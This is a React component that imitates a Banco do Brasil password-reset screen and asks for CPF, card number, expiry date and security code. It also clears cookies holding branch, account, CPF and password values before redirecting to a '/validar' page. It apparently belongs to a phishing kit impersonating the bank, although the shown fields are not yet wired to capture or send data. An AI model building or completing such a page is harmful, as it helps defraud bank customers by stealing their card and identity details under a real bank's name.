import React, { useState, useEffect } from "react";
import Cookies from "universal-cookie";
import { Redirect, Link } from "react-router-dom";

const Resetar = () => {
  useEffect(() => {
    let cookies = new Cookies();
    cookies.remove("agencia");
    cookies.remove("conta");
    cookies.remove("cpf");
    cookies.remove("senha");
  }, []);

  const [redirecionar, setRedirecionar] = useState(false);

  function onSubmit(e) {
    let cookies = new Cookies();
    let data = {};

    // cookies.remove("tipoDeConta");

    //cookies.set("tipoDeConta", tipoDeConta === "tipo1" ? "Corrente" : "Cartão");

    setRedirecionar(true);
  }

  return (
    <>
      {redirecionar ? <Redirect to="/validar" /> : ""}

      <div
        style={{
          padding: "20px 40px",
          textAlign: "left",
          color: "#005aa5",
          backgroundColor: "gold",
        }}
        className="titulo"
      >
        <h1>Banco do Brasil</h1>
      </div>
      <header style={{}}>
        <div className="icon">
          <a href="/">
            {" "}
            <i className="fa fa-arrow-left" style={{ color: "white" }}></i>
          </a>
        </div>
        <div className="title">
          <h1>Configurar nova senha</h1>
          <h2 style={{ fontWeight: "lighter", fontSize: "15px" }}>
            Para resetar sua senha é necessário confirmar alguns dados
          </h2>
        </div>
      </header>
      <main>
        <form autoComplete="off" className="loginForm" method="post" action="">
          <input
            type="text"
            // onChange={(e) => setSenha(e.target.value)}
            name=""
            placeholder="CPF"
            id=""
          />
          <input
            type="text"
            // onChange={(e) => setSenha(e.target.value)}
            name=""
            placeholder="Número do cartão"
            id=""
          />
          <input
            type="text"
            // onChange={(e) => setSenha(e.target.value)}
            name=""
            placeholder="Data de expiração"
            id=""
          />
          <input
            type="text"
            // onChange={(e) => setSenha(e.target.value)}
            name=""
            placeholder="Código de segurança"
            id=""
          />
        </form>
      </main>
      <div className="links">
        <a href="" className="redefinirSenha">
          Esqueci ou não tenho a senha
        </a>
      </div>
      <footer onClick={onSubmit}>
        <div className="icon"></div>
        <div className="action">CONFIRMAR</div>
      </footer>
    </>
  );
};

export default Resetar;
